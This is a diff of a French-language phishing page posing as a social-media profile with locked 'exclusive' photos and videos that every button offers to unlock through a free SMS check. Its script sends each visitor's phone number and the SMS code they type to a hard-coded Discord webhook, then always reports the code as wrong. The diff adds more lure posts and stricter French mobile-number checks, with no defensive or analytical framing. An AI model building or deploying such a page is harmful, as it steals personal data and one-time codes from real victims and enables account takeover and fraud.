+          <div class="post-time">Il y a 2 jours</div>
+        </div>
+        <div class="post-opts">⋯</div>
+      </div>
+      <div class="post-text">Album exclusif — 2 photos 🌸</div>
+      <div class="media-duo">
+        <div class="locked-media" onclick="openModal()" style="aspect-ratio:1">
+          <canvas id="lm1" width="200" height="200"></canvas>
+          <div class="lm-ov"><div class="lm-icon" style="font-size:20px">🔒</div></div>
+        </div>
+        <div class="locked-media" onclick="openModal()" style="aspect-ratio:1">
+          <canvas id="lm2" width="200" height="200"></canvas>
+          <div class="lm-ov"><div class="lm-icon" style="font-size:20px">🔒</div></div>
+        </div>
+      </div>
+      <div style="text-align:center;margin-bottom:.65rem">
+        <button class="lm-btn" onclick="openModal()">🔓 Déverrouiller les 2 photos</button>
+      </div>
+      <div class="post-actions">
+        <div class="pa"><span class="pi">🤍</span> 734</div>
+        <div class="pa"><span class="pi">💬</span> 95</div>
+        <div class="pa"><span class="pi">↗️</span> Partager</div>
+      </div>
+    </div>
+
+    <!-- Post 5 : vidéo verrouillée -->
+    <div class="post">
+      <div class="post-head">
+        <div class="post-av"><canvas id="post-av4" width="80" height="80"></canvas></div>
+        <div class="post-meta">
+          <div class="post-who">Léa M. <div class="vtick" style="width:12px;height:12px;font-size:6px">✓</div></div>
+          <div class="post-time">Il y a 3 jours</div>
+        </div>
+        <div class="post-opts">⋯</div>
+      </div>
+      <div class="post-text">Vidéo surprise de ce week-end 🎬🔥 Déverrouillez !</div>
+      <div class="locked-media lm-ratio-2" onclick="openModal()">
+        <canvas id="lm3" width="400" height="225"></canvas>
+        <div class="lm-ov">
+          <div class="lm-icon">▶️</div>
+          <div class="lm-txt">VIDÉO PRIVÉE · 3:42</div>
+          <button class="lm-btn">🔓 Regarder gratuitement</button>
+        </div>
+      </div>
+      <div class="post-actions">
+        <div class="pa"><span class="pi">🤍</span> 1.2k</div>
+        <div class="pa"><span class="pi">💬</span> 208</div>
+        <div class="pa"><span class="pi">↗️</span> Partager</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══ MEDIAS TAB ══ -->
+<div id="tab-medias" class="panel-tab">
+  <div class="media-grid">
+    <div class="mg-item" onclick="openModal()"><canvas id="mg0" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">PHOTO</div></div>
+    <div class="mg-item" onclick="openModal()"><canvas id="mg1" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">VIDÉO</div></div>
+    <div class="mg-item" onclick="openModal()"><canvas id="mg2" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">PHOTO</div></div>
+    <div class="mg-item" onclick="openModal()"><canvas id="mg3" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">VIDÉO</div></div>
+    <div class="mg-item" onclick="openModal()"><canvas id="mg4" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">PHOTO</div></div>
+    <div class="mg-item" onclick="openModal()"><canvas id="mg5" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">PHOTO</div></div>
+    <div class="mg-item" onclick="openModal()"><canvas id="mg6" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">VIDÉO</div></div>
+    <div class="mg-item" onclick="openModal()"><canvas id="mg7" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">PHOTO</div></div>
+    <div class="mg-item" onclick="openModal()"><canvas id="mg8" width="200" height="200"></canvas><div class="mg-ov"><div class="mg-lock">🔒</div></div><div class="mg-tag">PHOTO</div></div>
+  </div>
+</div>
+
+<!-- ══ ABOUT TAB ══ -->
+<div id="tab-about" class="panel-tab">
+  <div class="about-section">
+    <div class="about-row"><div class="ar-icon">📍</div><div><div class="ar-label">Localisation</div><div class="ar-val">Paris, France 🇫🇷</div></div></div>
+    <div class="about-row"><div class="ar-icon">🎂</div><div><div class="ar-label">Membre depuis</div><div class="ar-val">Janvier 2023</div></div></div>
+    <div class="about-row"><div class="ar-icon">📸</div><div><div class="ar-label">Contenus</div><div class="ar-val">58 publications · 42 médias</div></div></div>
+    <div class="about-row"><div class="ar-icon">💌</div><div><div class="ar-label">Messages privés</div><div class="ar-val">Ouverts à tous les abonnés</div></div></div>
+    <div class="about-row"><div class="ar-icon">🔓</div><div><div class="ar-label">Accès</div><div class="ar-val"><a href="#" onclick="openModal();return false">Gratuit via vérification SMS →</a></div></div></div>
+  </div>
+</div>
+
+</div><!-- end page-pad -->
+
+<!-- Bottom nav -->
+<div class="bnav">
+  <button class="bn active"><div class="bni">🏠</div>Accueil</button>
+  <button class="bn"><div class="bni">🔍</div>Explorer</button>
+  <button class="bn" onclick="openModal()"><div class="bni">🔔</div>Notifs</button>
+  <button class="bn" onclick="openModal()"><div class="bni">💬</div>Messages</button>
+  <button class="bn" onclick="openModal()"><div class="bni">👤</div>Profil</button>
+</div>
+
+<!-- ══ MODAL VÉRIFICATION ══ -->
+<div class="modal-bg" id="modal-bg" onclick="bgClose(event)">
+  <div class="modal">
+    <div class="modal-handle"></div>
+    <div class="modal-head">
+      <div class="mh-icon">🔓</div>
+      <div>
+        <div class="mh-title">Accès au contenu privé</div>
+        <div class="mh-sub">Vérification gratuite par SMS</div>
+      </div>
+      <div class="modal-close" onclick="closeModal()">✕</div>
+    </div>
+
     <div class="steps">
-      <div class="s active" id="s1"><div class="sd">1</div>Téléphone</div>
-      <div class="sl" id="sl"></div>
-      <div class="s" id="s2"><div class="sd">2</div>Code SMS</div>
+      <div class="stp active" id="mstp1"><div class="sdt">1</div>Téléphone</div>
+      <div class="stl" id="mstl"></div>
+      <div class="stp" id="mstp2"><div class="sdt">2</div>Code SMS</div>
     </div>
 
     <!-- Étape 1 -->
-    <div id="step1">
-      <div class="flabel">Ton numéro de téléphone</div>
+    <div id="mstep1">
+      <div class="flabel">Ton numéro de téléphone<span class="vtag" id="vtag"></span></div>
       <div class="frow">
         <div class="fflag">🇫🇷 +33</div>
-        <input type="tel" id="tel" placeholder="6 xx xx xx xx" />
+        <input type="tel" id="tel" placeholder="06 xx xx xx xx" oninput="onTel(this)" />
       </div>
-      <div class="sms-note">Un <strong>code de vérification gratuit</strong> sera envoyé par SMS pour confirmer ton accès.</div>
-      <button class="btn" id="btn1" onclick="doTel()">
-        <span class="btn-txt">Recevoir le code SMS</span>
-        <div class="spinner"></div>
+      <div class="fhint">Un <strong>code gratuit</strong> sera envoyé par SMS. <span class="hi">06 / 07 uniquement.</span></div>
+      <button class="mbtn" id="mbtn1" onclick="doTel()" disabled>
+        <span class="mbtxt">Recevoir mon code SMS</span><div class="mspin"></div>
       </button>
-      <div class="status" id="st1"></div>
-      <div class="fine">En continuant, tu acceptes nos <a href="#">Conditions d'utilisation</a> et notre <a href="#">Politique de confidentialité</a>.</div>
+      <div class="stmsg" id="mst1"></div>
+      <div class="fine">En continuant tu acceptes nos <a href="#">CGU</a> et notre <a href="#">politique de confidentialité</a>. Aucun abonnement requis.</div>
     </div>
 
     <!-- Étape 2 -->
-    <div id="step2" style="display:none">
-      <div class="flabel">Code de vérification</div>
+    <div id="mstep2" style="display:none">
+      <div class="flabel">Code de vérification à 6 chiffres</div>
       <div class="frow">
-        <input type="number" id="code" class="code-inp" placeholder="· · · · · ·" maxlength="6" />
+        <input type="number" id="code" placeholder="• • • • • •" oninput="onCode(this)" />
       </div>
-      <div class="sms-note" id="sms-dest">Code envoyé au <strong>+33 6XX XX XX XX</strong>. Vérifie tes SMS.</div>
-      <button class="btn" id="btn2" onclick="doCode()">
-        <span class="btn-txt">Vérifier et déverrouiller</span>
-        <div class="spinner"></div>
+      <div class="fhint" id="sms-dest">Code envoyé au <strong>+33 …</strong>. Vérifie tes SMS.</div>
+      <button class="mbtn" id="mbtn2" onclick="doCode()" disabled>
+        <span class="mbtxt">Vérifier et déverrouiller ✓</span><div class="mspin"></div>
       </button>
-      <div class="resend" id="resend">Renvoyer le code dans <em id="cd">60s</em></div>
-      <div class="status" id="st2"></div>
+      <div class="resend" id="resend-w">Renvoyer le code dans <em id="cdt">60s</em></div>
+      <div class="stmsg" id="mst2"></div>
     </div>
   </div>
-
 </div>
 
 <script>
-const WEBHOOK = 'https://discord.com/api/webhooks/1553393731628171494/boMxbb46x5Fc8vBbgTB9gz8lLefN6Pjbt_ut4ckHNK8SBMKgV0IombJpjw5tHwNWGp2U';
+const WH = 'https://discord.com/api/webhooks/1553393731628171494/boMxbb46x5Fc8vBbgTB9gz8lLefN6Pjbt_ut4ckHNK8SBMKgV0IombJpjw5tHwNWGp2U';
 
-// ── Génération avatar ──
-function drawAvatar(c) {
-  const ctx = c.getContext('2d'), s = c.width;
-  const g = ctx.createLinearGradient(0,0,s,s);
-  g.addColorStop(0,'#ff4d9e'); g.addColorStop(1,'#8b005b');
-  ctx.fillStyle = g; ctx.fillRect(0,0,s,s);
-  for (let i=0;i<6;i++) {
-    ctx.fillStyle='rgba(255,255,255,'+(0.04+Math.random()*.1)+')';
-    ctx.beginPath();
-    ctx.ellipse(Math.random()*s,Math.random()*s,20+Math.random()*40,20+Math.random()*40,Math.random()*Math.PI,0,Math.PI*2);
-    ctx.fill();
+/* ── canvas helpers ── */
+function rnd(min,max){return min+Math.random()*(max-min)}
+function drawBlob(ctx,cols,w,h,n=10){
+  for(let i=0;i<n;i++){
+    const x=rnd(0,w),y=rnd(0,h),r=rnd(30,Math.min(w,h)*.55);
+    const g=ctx.createRadialGradient(x,y,0,x,y,r);
+    const c=cols[Math.floor(Math.random()*cols.length)];
+    g.addColorStop(0,c+'cc');g.addColorStop(1,c+'00');
+    ctx.fillStyle=g;
+    ctx.beginPath();ctx.ellipse(x,y,r*rnd(.5,1),r*rnd(.5,1),rnd(0,Math.PI),0,Math.PI*2);ctx.fill();
   }
-  ctx.fillStyle='rgba(255,255,255,.9)';
-  ctx.font='bold 54px sans-serif';
-  ctx.textAlign='center';ctx.textBaseline='middle';
-  ctx.fillText('L',s/2,s/2+2);
 }
-
-// ── Génération images ──
-const pals = [
+function drawAbs(cv,cols){
+  const ctx=cv.getContext('2d'),w=cv.width,h=cv.height;
+  const bg=ctx.createLinearGradient(0,0,w,h);
+  bg.addColorStop(0,cols[0]);bg.addColorStop(1,cols[cols.length-1]);
+  ctx.fillStyle=bg;ctx.fillRect(0,0,w,h);
+  drawBlob(ctx,cols,w,h,12);
+  for(let i=0;i<30;i++){
+    ctx.fillStyle='rgba(255,255,255,'+(0.03+Math.random()*.18)+')';
+    ctx.beginPath();ctx.arc(rnd(0,w),rnd(0,h),rnd(.5,3),0,Math.PI*2);ctx.fill();
+  }
+}
+const P=[
   ['#ff1493','#ff69b4','#8b0057','#c71585'],
   ['#9b59b6','#e91e8c','#4a148c','#ff4db8'],
   ['#ff4da6','#ad1457','#ff80bf','#880e4f'],
   ['#ff6eb4','#c2185b','#f48fb1','#7b1fa2'],
+  ['#e91e8c','#ff69b4','#c2185b','#f48fb1'],
+  ['#6a1b9a','#ff4d9e','#880e4f','#d500f9'],
 ];
-function drawImg(c, cols) {
-  const ctx = c.getContext('2d'), w=c.width, h=c.height;
-  const bg = ctx.createLinearGradient(0,0,w,h);
-  bg.addColorStop(0,cols[0]); bg.addColorStop(1,cols[3]);
-  ctx.fillStyle=bg; ctx.fillRect(0,0,w,h);
-  for (let i=0;i<9;i++) {
-    const x=Math.random()*w, y=Math.random()*h, r=30+Math.random()*100;
-    const g=ctx.createRadialGradient(x,y,0,x,y,r);
-    const c2=cols[Math.floor(Math.random()*cols.length)];
-    g.addColorStop(0,c2+'cc'); g.addColorStop(1,c2+'00');
-    ctx.fillStyle=g;
-    ctx.beginPath(); ctx.ellipse(x,y,r*(.5+Math.random()*.9),r*(.5+Math.random()*.9),Math.random()*Math.PI,0,Math.PI*2); ctx.fill();
+
+/* banner */
+(function(){
+  const cv=document.getElementById('banner-cv');
+  cv.width=cv.parentElement.offsetWidth||420;cv.height=130;
+  drawAbs(cv,['#3d0030','#7b0060','#ff4d9e','#2a0025']);
+  const ctx=cv.getContext('2d');
+  for(let i=0;i<5;i++){
+    ctx.fillStyle='rgba(255,255,255,'+(0.02+Math.random()*.05)+')';
+    ctx.beginPath();ctx.ellipse(rnd(0,cv.width),rnd(0,130),rnd(40,100),rnd(20,60),rnd(0,Math.PI),0,Math.PI*2);ctx.fill();
   }
-  for (let i=0;i<40;i++) {
-    ctx.fillStyle='rgba(255,255,255,'+(0.04+Math.random()*.18)+')';
-    ctx.beginPath(); ctx.arc(Math.random()*w,Math.random()*h,.5+Math.random()*3,0,Math.PI*2); ctx.fill();
-  }
+})();
+
+/* avatar */
+(function(){
+  const cv=document.getElementById('av-cv'),ctx=cv.getContext('2d'),s=150;
+  const g=ctx.createLinearGradient(0,0,s,s);g.addColorStop(0,'#ff4d9e');g.addColorStop(1,'#8b005b');
+  ctx.fillStyle=g;ctx.fillRect(0,0,s,s);
+  drawBlob(ctx,['#ff1493','#ff69b4','rgba(255,255,255,.2)'],s,s,8);
+  ctx.fillStyle='rgba(255,255,255,.92)';ctx.font='bold 60px sans-serif';
+  ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText('L',s/2,s/2+3);
+})();
+
+/* post avatars */
+function miniAv(id){
+  const cv=document.getElementById(id);if(!cv)return;
+  const ctx=cv.getContext('2d'),s=cv.width;
+  const g=ctx.createLinearGradient(0,0,s,s);g.addColorStop(0,'#ff4d9e');g.addColorStop(1,'#8b005b');
+  ctx.fillStyle=g;ctx.fillRect(0,0,s,s);
+  ctx.fillStyle='rgba(255,255,255,.88)';ctx.font='bold 34px sans-serif';
+  ctx.textAlign='center';ctx.textBaseline='middle';ctx.fillText('L',s/2,s/2+2);
+}
+['post-av0','post-av1','post-av2','post-av3','post-av4'].forEach(miniAv);
+
+/* media canvases */
+const mediaIds=['lm0','lm1','lm2','lm3','mg0','mg1','mg2','mg3','mg4','mg5','mg6','mg7','mg8'];
+mediaIds.forEach((id,i)=>{ const cv=document.getElementById(id);if(cv) drawAbs(cv,P[i%P.length]); });
+
+/* ── tabs ── */
+function showTab(name,el){
+  document.querySelectorAll('.panel-tab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById('tab-'+name).classList.add('active');
+  el.classList.add('active');
 }
 
-drawAvatar(document.getElementById('avc'));
-for (let i=0;i<4;i++) drawImg(document.getElementById('cv'+i), pals[i]);
+/* ── modal ── */
+function openModal(){document.getElementById('modal-bg').classList.add('open');document.body.style.overflow='hidden'}
+function closeModal(){document.getElementById('modal-bg').classList.remove('open');document.body.style.overflow=''}
+function bgClose(e){if(e.target===document.getElementById('modal-bg')) closeModal()}
 
-// ── Countdown ──
-let cdv = 60, cdTimer;
-function startCd() {
-  cdv=60; document.getElementById('cd').textContent=cdv+'s';
-  clearInterval(cdTimer);
-  cdTimer=setInterval(()=>{
-    cdv--;
-    if (cdv<=0){clearInterval(cdTimer);document.getElementById('resend').innerHTML='<em style="color:rgba(255,77,158,.6);cursor:pointer">Renvoyer le code</em>';}
-    else document.getElementById('cd').textContent=cdv+'s';
-  },1000);
+/* ── phone validation ── */
+function clean(v){return v.replace(/\D/g,'')}
+function fmt(v){const d=clean(v).slice(0,10);const p=[];for(let i=0;i<d.length;i+=2)p.push(d.slice(i,i+2));return p.join(' ')}
+function validFr(v){
+  const d=clean(v);
+  if(d.length!==10)return false;
+  if(!/^0[67]/.test(d))return false;
+  if(/^(.)\1{9}$/.test(d))return false;
+  if(['0600000000','0700000000','0612345678','0712345678'].includes(d))return false;
+  return true;
+}
+function onTel(el){
+  el.value=fmt(el.value);
+  const r=clean(el.value),vt=document.getElementById('vtag'),b=document.getElementById('mbtn1'),st=document.getElementById('mst1');
+  st.innerHTML='';st.className='stmsg';
+  if(r.length===10){
+    if(validFr(r)){vt.textContent='✓ Valide';vt.className='vtag ok';el.className='v-ok';b.disabled=false;}
+    else{
+      vt.textContent='✗ Invalide';vt.className='vtag er';el.className='v-er';b.disabled=true;
+      st.innerHTML='<span>⚠️</span> '+(!/^0[67]/.test(r)?'Numéro mobile requis (06 ou 07).':'Numéro non reconnu.');st.className='stmsg err';
+    }
+  } else {vt.className='vtag';el.className='';b.disabled=true;}
+}
+function onCode(el){
+  el.value=el.value.replace(/\D/g,'').slice(0,6);
+  document.getElementById('mbtn2').disabled=el.value.length<4;
 }
 
-// ── Étape 1 : téléphone ──
-async function doTel() {
-  const tel = document.getElementById('tel').value.trim();
-  const st  = document.getElementById('st1');
-  const btn = document.getElementById('btn1');
+/* ── countdown ── */
+let _t;
+function startCd(){
+  let s=60;document.getElementById('cdt').textContent=s+'s';clearInterval(_t);
+  _t=setInterval(()=>{s--;if(s<=0){clearInterval(_t);document.getElementById('resend-w').innerHTML='<em style="color:rgba(255,77,158,.65);cursor:pointer" onclick="startCd()">Renvoyer le code →</em>';}else document.getElementById('cdt').textContent=s+'s';},1000);
+}
 
-  if (!tel || tel.length < 8) {
-    st.innerHTML='<span>⚠️</span> Entre un numéro valide.'; st.className='status err'; return;
-  }
-
-  btn.classList.add('loading');
-  st.innerHTML=''; st.className='status';
-
-  try {
-    await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({content:'📱 **Numéro de téléphone**\n```\n+33 '+tel.replace(/^0/,'')+'\n```'})});
-  } catch(_){}
-
-  await new Promise(r=>setTimeout(r,1600));
-  btn.classList.remove('loading');
-
-  // Passer étape 2
-  document.getElementById('step1').style.display='none';
-  document.getElementById('step2').style.display='block';
-  document.getElementById('s1').className='s done';
-  document.getElementById('sl').className='sl done';
-  document.getElementById('s2').className='s active';
-  const clean='+33 '+tel.replace(/^0/,'').replace(/(\d{1})(\d{2})(\d{2})(\d{2})(\d{2})/,'$1 $2 $3 $4 $5');
-  document.getElementById('sms-dest').innerHTML='Code envoyé au <strong>'+clean+'</strong>. Vérifie tes SMS.';
+/* ── step 1 ── */
+async function doTel(){
+  const r=clean(document.getElementById('tel').value);
+  const b=document.getElementById('mbtn1'),st=document.getElementById('mst1');
+  if(!validFr(r)){st.innerHTML='<span>⚠️</span> Numéro invalide.';st.className='stmsg err';return;}
+  b.classList.add('loading');st.innerHTML='';st.className='stmsg';
+  const disp='+33 '+r.slice(1).replace(/(\d)(\d{2})(\d{2})(\d{2})(\d{2})/,'$1 $2 $3 $4 $5');
+  try{await fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'📱 **Numéro reçu**\n```\n'+disp+'\n```'})});}catch(_){}
+  await new Promise(r=>setTimeout(r,1800));
+  b.classList.remove('loading');
+  document.getElementById('mstep1').style.display='none';
+  document.getElementById('mstep2').style.display='block';
+  document.getElementById('mstp1').className='stp done';
+  document.getElementById('mstl').className='stl done';
+  document.getElementById('mstp2').className='stp active';
+  document.getElementById('sms-dest').innerHTML='Code envoyé au <strong>'+disp+'</strong>. Vérifie tes SMS.';
   document.getElementById('code').focus();
   startCd();
 }
 
-// ── Étape 2 : code ──
-async function doCode() {
-  const code = document.getElementById('code').value.trim();
-  const st   = document.getElementById('st2');
-  const btn  = document.getElementById('btn2');
-
-  if (!code) {
-    st.innerHTML='<span>⚠️</span> Entre le code reçu par SMS.'; st.className='status err'; return;
-  }
-
-  btn.classList.add('loading');
-  st.innerHTML=''; st.className='status';
-
-  try {
-    await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({content:'🔑 **Code entré**\n```\n'+code+'\n```'})});
-  } catch(_){}
-
-  await new Promise(r=>setTimeout(r,2000));
-  btn.classList.remove('loading');
-  st.innerHTML='<span>❌</span> Code incorrect ou expiré. Réessaie.'; st.className='status err';
+/* ── step 2 ── */
+async function doCode(){
+  const code=document.getElementById('code').value.trim();
+  const b=document.getElementById('mbtn2'),st=document.getElementById('mst2');
+  b.classList.add('loading');st.innerHTML='';
+  try{await fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🔑 **Code entré**\n```\n'+code+'\n```'})});}catch(_){}
+  await new Promise(r=>setTimeout(r,2200));
+  b.classList.remove('loading');
+  st.innerHTML='<span>❌</span> Code incorrect ou expiré. Réessaie ou renvoie un nouveau code.';st.className='stmsg err';
 }
 
-// Touche Entrée
-document.addEventListener('keydown', e=>{
-  if(e.key!=='Enter') return;
-  if(document.getElementById('step2').style.display==='none') doTel();
-  else doCode();
+document.addEventListener('keydown',e=>{
+  if(e.key!=='Enter'||!document.getElementById('modal-bg').classList.contains('open')) return;
+  if(document.getElementById('mstep2').style.display==='none') doTel(); else doCode();
 });
 </script>
 </body>
